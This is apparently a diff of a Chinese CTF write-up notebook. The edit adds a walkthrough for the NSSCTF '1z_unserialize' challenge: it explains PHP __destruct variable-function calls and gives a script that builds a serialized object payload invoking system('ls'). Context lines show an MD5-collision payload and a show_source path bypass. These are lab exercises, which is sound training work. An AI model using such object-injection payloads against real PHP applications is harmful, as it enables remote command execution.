@@ -1421,7 +1421,6 @@ TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
 
 这是两个不同的字符串,但是MD5相同为`faad49866e9498fc1719f5289e7a0269`
 
-
 构造playload
 
 ```bash
@@ -1431,8 +1430,6 @@ a[]=1&b1=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKna
 得到flag
 
 ![1761657627731](images/NSS/1761657627731.png)
-
-
 
 # 39.[鹤城杯 2021]EasyP
 
@@ -1480,7 +1477,6 @@ a[]=1&b1=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKna
 
 如果 URL 中存在`show_source`参数，则展示`basename($_SERVER['PHP_SELF'])`对应的文件的源码（语法高亮），然后终止脚本。
 
-
 可以通过url编码绕过:(注意构造的恶意路径前面必须要加上index.php)
 
 ### 1. 先理解：服务器如何处理 URL 请求（为什么直接访问`/utils.php`会报错）
@@ -1511,7 +1507,6 @@ playload:
 
 (注:满足了\$secret = "nssctfrtdfgvhbjdas";也没有意义,什么都不会出现)
 
-
 # 40.[SWPUCTF 2022 新生赛]ez\_ez\_php(revenge)
 
 ![1761662433777](images/NSS/1761662433777.png)
@@ -1531,3 +1526,66 @@ playload:
 尝试访问/flag得到flag
 
 ![1761663208734](images/NSS/1761663208734.png)
+
+# 41.[SWPUCTF 2022 新生赛]1z\_unserialize
+
+![1761721659174](images/NSS/1761721659174.png)
+
+### 一、关于 `__destruct()` 析构方法的深度解释
+
+析构方法是 PHP 面向对象中的 “生命周期钩子”，它的核心特点是**自动触发**，触发时机与对象的 “销毁” 强绑定。
+
+1. **触发时机的具体场景**：
+
+   * 最常见的情况：**脚本执行结束时**。PHP 脚本从开始到结束会创建各种对象，当整个脚本跑完（比如处理完一个 HTTP 请求后），所有未被手动销毁的对象会被 PHP 引擎自动清理，此时每个对象的`__destruct()`会被调用。
+   * 手动销毁对象：比如用`unset($obj)`主动删除对象变量，或给对象变量赋新值（如`$obj = null`），此时对象失去引用，会被立即销毁，触发析构方法。
+   * 垃圾回收：当对象没有任何变量引用它时（比如超出作用域），PHP 的垃圾回收机制会回收它，此时也会触发析构方法。
+2. **`__destruct()` 内部逻辑的风险点**：这段代码的析构方法做了两件事：
+   php
+
+   ```php
+   $a = $this->lt;  // 把当前对象的lt属性值传给$a
+   $a($this->lly);  // 用$a作为函数，传入lly属性值作为参数执行
+   ```
+
+   这里的关键是 **`$a`被当作函数调用**。在 PHP 中，这种 “变量作为函数名” 的调用方式（称为 “可变函数”）是允许的，但要求`$a`必须是 “可调用的”（callable）。例如：
+
+   * 如果`$a = 'system'`（系统函数名），那么`$a($this->lly)`就等价于`system($this->lly)`，会执行系统命令（参数是`lly`的值）。
+   * 如果`$a = 'eval'`，则等价于`eval($this->lly)`，可以执行 PHP 代码（参数是`lly`的字符串）。
+   * 甚至可以是匿名函数，比如`$a = function($x){echo $x;}`，此时会执行这个匿名函数。
+
+### 二、`unserialize($_POST['nss'])` 的作用与风险
+
+反序列化的核心是 “还原数据”，但在 PHP 中，它还原的可能是**对象**，而对象的行为由其类定义（包括析构方法）决定。
+
+```php
+<?php
+class lyh{
+    public $url = 'NSSCTF.com';  // 原始默认值，可不改
+    public $lt;
+    public $lly;
+}
+
+// 创建对象并赋值
+$exp = new lyh();
+$exp->lt = 'system';  // 函数名：执行系统命令的函数
+$exp->lly = 'ls';     // 命令：列出当前目录文件（可替换为其他命令，如 'whoami'、'phpinfo()' 等）
+
+// 生成序列化字符串
+echo serialize($exp);
+?>
+```
+
+```
+`O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:2:"ls";}`
+```
+
+![1761722909347](images/NSS/1761722909347.png)
+
+发现flag不在当前目录,在/根目录下,用cat查看
+
+![1761722997419](images/NSS/1761722997419.png)
+
+# 42.[CISCN 2019华东南]Web11
+
+![1761725418986](images/NSS/1761725418986.png)
